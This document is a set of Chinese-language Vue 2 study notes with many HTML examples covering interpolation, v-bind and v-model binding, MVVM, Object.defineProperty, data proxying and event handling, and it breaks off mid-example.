### Vue学习

Vue2 --> Vue3

路线如下：

![image](410523BA092F4BE0BBE96F6CD10A757A)

---

### Vue简介

Vue是一套用于构建用户界面的渐进式JavaScript框架。

构建用户页面可以理解为将后端数据渲染为页面。

---

### Vue时间线

![image](2919576B33374B4A890380946CF5DA30)

---

### Vue特点

![image](C816EB8343C648178452B0E51308FCF8)

![image](50E008AF3B6441E7916E0A2819348733)

![image](AE8DE78D2ABC4AD7BDCC5E2051AF7FAE)

---

### Vue官网

![image](98B08521E9F74B47907021233D0438CE)

教程和API都可以在Vue官网进行查询。

---

### 搭建Vue环境

官网下载Vue.js和Vue devtools,以及关闭Vue的安全提示。

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<script>
			
		</script>
	</body>
</html>
```
---

### Vue 小案例

![image](98861944CF35455E8A311DBABDE7E0CD)

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<h1>{{companyName}}</h1>
		</div>
		
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					companyName: '尚硅谷'
				}
			})
			
		</script>
	</body>
</html>
```

---

### 案例分析

一个Vue实例只能绑定一个元素。如果el后面的选择器可以在页面中找到多个元素时，只会绑定第一个元素。

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<h1>{{companyName}}</h1>
		</div>
		<div id="root">
			<h1>{{companyName}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					companyName: '尚硅谷'
				}
			})
			
		</script>
	</body>
</html>
```

![image](9D4C363849274BD49D3D3699B14EC1BA)

容器中使用的数据一定要在绑定的Vue实例的data属性中定义。
```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 插值语法，{{country}}代表去绑定中的Vue的data对象中选择属性为country对应的值。 -->
			<!-- 如果插值语法中使用了绑定中的Vue的data对象中没有定义的属性，比如{{age}},会报错 -->
			<h1>{{country}}-{{province}}-{{city}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					country: '中国',
					province: '湖北'
				}
			})
			
		</script>
	</body>
</html>
```

![image](7953DDD181DD41F3AB2B9E0CFC1ABD20)

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 插值语法，{{}}里面可以是计算表达式或者JS语句或者函数返回值 -->
			<h1>{{1+1}}</h1>
			<h1>{{Date.now()}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					country: '中国',
					province: '湖北'
				}
			})
			
		</script>
	</body>
</html>
```

![image](D5D02B50251B46369A4F686929FC1FC5)

如果Vue实例中data对象的数据发生变化，页面会重新进行解析，页面展示的内容发生变化。

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 插值语法，{{}}里面可以是计算表达式或者JS语句或者函数返回值 -->
			<h1>{{country}}</h1>
			<h1>{{province}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					country: '中国',
					province: '湖北'
				}
			})
		</script>
	</body>
</html>
```
![image](3C8F0A8CF64B4633BC314E721E92A143)

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 插值语法，{{}}里面可以是计算表达式或者JS语句或者函数返回值 -->
			<h1>{{country}}</h1>
			<h1>{{province}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					country: '中国',
					province: '湖南'
				}
			})
		</script>
	</body>
</html>
```
![image](E5907DDCE54D4FD1B01ACBF0BABFD985)

构造Vue实例的时候，必须通过new Vue()方式构建，省略new会报错。

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 插值语法，{{}}里面可以是计算表达式或者JS语句或者函数返回值 -->
			<h1>{{country}}</h1>
			<h1>{{province}}</h1>
		</div>
		<script>
			Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					country: '中国',
					province: '湖南'
				}
			})
		</script>
	</body>
</html>
```

![image](AAD969012DDE4266AE05B32A8F28E12E)

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>第一次使用vue</title>
    <!--vue js生产版本production版本-->
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
     <!--插值语法-->
     <!--vue模版-->
        <h1>hello, {{ name }}</h1>
    </div>
    <div class="test">
        <!--注意双花括号中可以写js表达式-->
        <!--
          js表达式：一个表达式生成一个值，放在任何一个需要值的地方
                例如 (1).a (2) 1+b (3) demo(1) （4) x===y ? 1 : 0

          js语句： if while for...
        -->
        <h1>{{name.toUpperCase()}},{{address}} {{1+1}} {{Date.now()}}</h1>
    </div>
    <script type="text/javascript">
       //hello小案例
       Vue.config.productionTip = false; //默认不提示
       //创建vue事例对象
       /**
        * 注意:一个vue实例不可能去接管多个容器，如果有多个容器的情况，vue事例永远只接管第一个容器
        * 不能多个vue实例同时来接管同一个容器，如果有多个的情况下永远是第一个vue实例来接管该容器
        * vue实例与容器直接的对应关系是一对一的
        */
       new Vue({
           //配置对象
           el: '#root',// document.getElementById('root') //element el指定当前vue实例为哪一个容器服务，值通常为css选择器格式
           data: {
               //data用来存储数据，以后会用函数来表示
               name:'panyue',
               age:21
           }
       });

       new Vue({
           el: '.test',
           data:{
               name: 'test',
               address: 'Tokyo'
           }
       })
    </script>
</body>
</html>
```

---

### Vue模板语法

模板语法包含插值语法与指令语法

插值语法

示例

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<h1>hi,{{userName}}</h1>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					userName:'jack'
				}
			})
		</script>
	</body>
</html>
```

实例

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 把a元素中的地址作为一个变量 -->
			<!-- v-bind代表动态的绑定元素的属性的值-->
			<!-- v-bind:href="url"语句代表动态绑定a元素中href属性的值，href的值等于绑定的Vue实例data对象中的url属性的值 -->
			<a v-bind:href="url">百度</a>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					url:'www.baidu.com'
				}
			})
		</script>
	</body>
</html>
```
注意，data对象的属性可以是对象,此时需要指定特定的值。

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- 把a元素中的地址作为一个变量 -->
			<!-- v-bind代表动态的绑定元素的属性的值-->
			<!-- v-bind:href="url"语句代表动态绑定a元素中href属性的值，href的值等于绑定的Vue实例data对象中的url属性的值 -->
			<a v-bind:href="site.url">{{site.website}}</a>
		</div>
		<script>
			new Vue({
				// el用于指定Vue实例为哪一个容易服务，值通常为css选择器
				// 如果页面中有2个id是root的元素，只能绑定第一个元素
				el:'#root' ,
				// data属性是一个对象，该对象中存储容器中需要用到的数据
				data:{ 
					site:{
						url: 'www.baidu.com',
						website: '百度'
					}
				}
			})
		</script>
	</body>
</html>
```

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Vue模版语法的学习</title>
    <script src="../js/vue.js"></script>
</head>
<body>
   <div id="root">
       <!--
          插值语法一般用在标签体的值{{}}
          指令语法:用于解析标签(标签体,标签属性, 绑定事件)上，类似于v-bind
       -->
       <h1>插值语法</h1>
       <h3>你好, {{ name }} </h3>
       <hr/>
       <h1>指令语法</h1>
       <!--v-bind绑定指令，就把下面的url当成一个js表达式去执行了-->
       <a v-bind:href="url.toUpperCase()" v-bind:x="x">百度一下</a>
       <!-- v-bind: 还可以简写为: -->
       <a :href="url_taiwan" :x="x">google 台湾</a>
       <p>学校: <a :href="school.url.toString()">{{ school.name }}</a> </p>
   </div>
   <script type="text/javascript">
       new Vue({
           el: "#root",
           data: {
               name : 'jack',
               url : 'https://www.baidu.com',
               x: 'test v-bind',
               url_taiwan: 'https://www.google.com.tw',
               school: {
                   name: '武汉科技大学',
                   url:'https://www.wust.edu.cn/'
               }
           }
       })
   </script>
</body>
</html>
```
---

### 数据绑定

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<!-- 定义一个容器 -->
		<div id="root">
			<!-- Vue实例中website的值改变，input元素的value值发生改变 -->
			<!-- 但是我们手动修改input元素的value值发生改变，无法修改Vue实例中website的值 -->
			单向数据绑定：<input type="text" v-bind:value="website">
		</div>
		<script>
			new Vue({
				el:'#root' ,
				data:{ 
					website: '百度'
				}
			})
		</script>
	</body>
</html>
```
![image](1CF2BA12BD384662BAB779C0F2FB58A4)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue 数据绑定</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!--
			Vue中有2种数据绑定的方式：
					1.单向绑定(v-bind)：数据只能从data流向页面。
					2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
						备注：
							1.双向绑定一般都应用在表单类元素上（如：input、select等）
							2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
		 -->
        <label>
            单项数据绑定:
            <!--<input type='text' v-bind:value="name"/>-->
            <!--简写-->
            <input type='text' :value="name"/>
        </label>
        <label>
            双向数据绑定:
            <!--<input type='text' v-model:value="name"/>-->
            <input type='text' v-model="name"/>
        </label>
        <br/>
         <!--
         不是什么都可用v-model的 这里v-model不支持h1
         v-model只能应用在表单元素上(输入元素)，与用户交互(都有共同的value属性)
         -->
        <h1 v-bind:x="name">
            你好啊
        </h1>
    </div>
    <script type="text/javascript">
        //v-bind可以完成数据绑定(单项绑定)
        //v-model双向数据绑定
        //单项数据绑定 双向数据绑定
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data:{
                name: 'shanghai'
            }
        })
    </script>
</body>
</html>
```
---

### el和data的另一种写法

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<div id="root">
			hi，{{website}}
		</div>
		<script>
			// 创建Vue实例
			const v = new Vue({
				data:{ 
					website: '百度'
				}
			})
			// Vue实例绑定容器
			v.$mount('#root')
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<div id="root">
			hi，{{website}}
		</div>
		<script>
			// 创建Vue实例
			new Vue({
				el: '#root',
				// 将data属性，写成一个函数，该函数返回一个对象
				data: function() {
					return {
						website: '百度'
					}
				}
			})
		</script>
	</body>
</html>
```

总结
```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>el和data的两种写法</title>
    <script src="../js/vue.js"></script>
</head>
<body>
   <div id="root">
       <!--
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数(例如data)，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->

       <h1>你好，{{ name }}</h1>
   </div>
   <script type="text/javascript">
       Vue.config.productionTip = false;
       //el的两种写法
       // const v = new Vue({
       //     // el: '#root', //第一种写法
       //     data: {
       //         name: '上海'
       //     }
       // });
       //
       // // console.log(v);
       // //关联root容器，用mount方法
       // setTimeout(() => {
       //     v.$mount('#root'); //第二种写法 挂载到页面上
       // }, 3000)

       //data的两种写法
       new Vue({
          el: '#root',
           //data的第一种写法:对象式
           // data: {
           //     name: 'shanghai'
           // }
           //第二种写法: 函数式(返回对象中包含你想渲染的模版数据)
           //学习组件的时候要是用函数式 这个函数是Vue来调用的
           // data: () => {
           //    console.log(`@@@@`, this); //此时this是window，因为箭头函数没有自己的this，它向外查找找到的window
           //    return ({
           //         name: 'shanghai'
           //     })
           // }
           //尽量不要写成剪头函数，因为会丢失this
           data (){
              console.log('@@@', this); //此时this是Vue
              return {
                  name: 'shanghai'
              }
           }
       });
   </script>
</body>
</html>
```
---

### 理解MVVM模型

![image](BB7B41C2949A4DE3837A7B742D719262)

注意，绑定的Vue的实例的所有属性均可以在绑定的容器中利用插值语法或者指令语法来使用。
```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
		<script type="text/javascript" src="Vue/vue.js"></script>
	</head>
	<body>
		<div id="root">
			hi，{{$el}}
		</div>
		<script>
			// 创建Vue实例
			const vm = new Vue({
				el: '#root',
			})
			console.log(vm)
		</script>
	</body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>mvvm模型的理解</title>
    <script src="../js/vue.js"></script>
</head>
<body>
       <!--
			MVVM模型
						1. M：模型(Model) ：data中的数据
						2. V：视图(View) ：模板代码
						3. VM：视图模型(ViewModel)：Vue实例
			观察发现：
						1.data中所有的属性，最后都出现在了vm身上。
						2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
		-->
    <div id="root">
        <!--view-->
        <h1>学校名称: {{ name }}</h1>
        <h1>学校地址:{{ address }}</h1>
        <h1>测试一下1:  {{ 1 + 1 }}</h1>
        <!--所有viewModel和vue原型上的属性在视图中的{{}}都可以看到-->
<!--        <h1>测试一下2: {{ $options }}</h1>-->
<!--        <h1>测试一下3: {{ $emit }}</h1>-->
<!--        <h1>测试一下4: {{ _c }}</h1>-->
    </div>
    <script type="text/javascript">
        //view model view与model之间的纽带
        //vm view实例对象
        const vm =  new Vue({
            el: '#root',
            data(){
                //model
                return {
                    name:'武汉科技大学',
                    address: '武汉'
                }
            }
        });
        console.log(vm);
    </script>
</body>
</html>
```

---

### Object.defineproperty理解

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>
			
		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				value: 18
			})
			// 打印person对象
			console.log(person)
		</script>
	</body>

```

和下面这样写有什么区别？

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>
			
		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男',
				age: '18'
			}
			// 打印person对象
			console.log(person)
		</script>
	</body>

```

其中上面的person对象中age属性不可被枚举。下面的可以。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>
			
		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男',
				age: '18'
			}
			
			// 打印person对象
			console.log(person)
			// 打印person对象的所有属性名
			console.log(Object.keys(person)) // ['name','sex','age']
		</script>
	</body>

```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				value: 18
			})
			// 打印person对象
			console.log(person)
			// 打印person对象的所有属性名
			console.log(Object.keys(person)) // ['name','sex']
		</script>
	</body>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				value: 18,
				// 设置age属性可以枚举，但是age属性的值不可以被修改
				enumerable: true,
				
			})
			// 出错，不可以被修改
			person.age = 18
			// 打印person对象
			console.log(person)
			// 打印person对象的所有属性名
			console.log(Object.keys(person)) // ['name','sex','age']
		</script>
	</body>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				value: 18,
				// 设置age属性可以枚举，但是age属性的值不可以被修改
				enumerable: true,
				// 设置属性的值是否可以被修改
				writable: true
				
			})
			// 值可以被修改
			person.age = 18
			// 打印person对象
			console.log(person)
			// 打印person对象的所有属性名
			console.log(Object.keys(person)) // ['name','sex','age']
		</script>
	</body>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				value: 18,
				// 设置age属性可以枚举，但是age属性的值不可以被修改
				enumerable: true,
				// 设置属性的值是否可以被修改
				writable: true,
				// 设置属性是否可以被删除
				configurable: true
				
			})
			// 删除person.age属性
			delete person.age
			// 打印person对象
			console.log(person)
			// 打印person对象的所有属性名
			console.log(Object.keys(person)) // ['name','sex','age']
		</script>
	</body>

```

这样这个方法可以对对象的属性进行各种限制。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			// 一个需求，person对象中有一个属性的值是number变量的值，number变化时，对象属性的值也自动变化。
			let number = 18
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				// 当读取person的age属性是，该函数被调用，并返回一个值
				get: function() {
					return number
				}	
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			// 一个需求，person对象中有一个属性的值是number变量的值，number变化时，对象属性的值也自动变化。
			let number = 18
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				// 当读取person的age属性是，该函数被调用，并返回一个值
				get: function() {
					return number
				}	
			})
			// number变化，person.age也发生变化
			number = 19
			console.log(person.age)
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			// 一个需求，person对象中有一个属性的值是number变量的值，number变化时，对象属性的值也自动变化。
			let number = 18
			let person = {
				name: '张三',
				sex: '男'
			}
			// 给person对象添加age属性
			Object.defineProperty(person, 'age', {
				// 当读取person的age属性是，该函数被调用，并返回一个值
				get: function() {
					return number
				},
				// 当设置person的age属性时，set函数会被调用,修改后的值会被调用
				set: function(newValue) {
					// 这样，每次当person.age被修改时，number的值也被修改
					number = newValue
				}
			})
			// number变化，person.age也发生变化
			number = 19
			console.log(person.age)
			// person.age发生变化，number也变化，
			person.age = 20
			console.log(number)
		</script>
	</body>
</html>
```

---

### 数据代理

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, min-scale=1.0 max-scale=1.0 user-scale="
			no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>Document</title>
		<style>

		</style>
	</head>

	<body>
		<script>
			// 数据代理：通过一个对象代理对另一个对象的读写操作
			
			let obj1 = {x:100}
			let obj2 = {y:200}
			
			// 这样可以利用obj2来对obj1的x属性进行读写操作
			Object.defineProperty(obj2, 'x', {
				get: function() {
					return obj1.x
				},
				set: function(newValue) {
					obj1.x = newValue
				}
			})
			// 这样可以利用obj2来对obj1的x属性进行读写操作
			console.log(obj2.x)
			console.log(obj1.x)
			obj2.x = 200
			console.log(obj2.x)
			console.log(obj1.x)
		</script>
	</body>
</html>
```

---

### 数据代理作用

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>学校名称：{{schoolName}}</h2>
			<h2>学校邮箱：{{schoolAddress}}</h2>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学',
					schoolAddress: '北京'
				}
			})
		</script>
	</body>
</html>
```

![image](2B3A15EE752E4C10AC635FED5E08E026)

![image](78D4CA55E6AA48D8832A3F4E2036A092)

首先，利用vm._data = data来获取数据，接着，在vm中data对象和vm对象中建立数据代理，vm中属性发生变化，则data对象的属性发生变化，另外，data对象属性发生变化，vm对象访问到的属性也发生变化。

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue中的数据代理</title>
    <script src="../js/vue.js"></script>
</head>
<body>
        <!--
				1.Vue中的数据代理：
							通过vm对象来代理data对象中属性的操作（读/写）
				2.Vue中数据代理的好处：
							更加方便的操作data中的数据
				3.基本原理：
							通过Object.defineProperty()把data对象中所有属性添加到vm上。
							为每一个添加到vm上的属性，都指定一个getter/setter。
							在getter/setter内部去操作（读/写）data中对应的属性。
		 -->
     <div id="root">
         <h2>学校名称:{{ name }}</h2>
         <h2>学校地址: {{ address }}</h2>
     </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        let data;
        //通过vm代理
        const vm = new Vue({
           el:'#root',
            //vm._data === options.data = data
            //
           data(){
               return data = {
                   name:'panyue',
                   address:'shanghai'
               }
           }
        });
    </script>
</body>
</html>
```

---

### 事件处理

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<button v-on:click="showInfo">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					showInfo(event) {
						console.log(this) // vm对象
						alert('同学你好')
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<button v-on:click="showInfo">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					// 如果写成箭头函数，this对象是window
					showInfo:(event) => {
						console.log(this) // window对象
						
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<button v-on:click="showInfo">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					// 注意，所有被Vue管理的函数必须写成普通函数形式
					showInfo(event) {
						console.log(this) // vue对象
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
